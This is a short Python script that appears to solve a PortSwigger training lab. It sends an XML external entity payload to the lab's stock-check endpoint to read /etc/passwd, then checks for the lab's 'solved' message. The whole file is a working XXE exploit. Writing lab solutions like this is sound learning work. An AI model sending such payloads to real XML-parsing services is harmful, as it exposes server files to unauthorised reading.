#!/usr/bin/env python


'''This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.

Lab link: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
'''

import requests


lab_id = '0ad500c403fa2f108174da6500430000' #change based on generated lab
uri = f"https://{lab_id}.web-security-academy.net/product/stock" 

payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;
</productId><storeId>1</storeId></stockCheck>''' # XXE for getting username/password

header = { "Content-Type" : "application/xml"}

r = requests.post(uri, data=payload, headers=header)
print(r.text)
r2 = requests.get(f"https://{lab_id}.web-security-academy.net")
if "Congratulations" in r2.text:
    print("solved")
else:
    print("nope")
    print(r.text)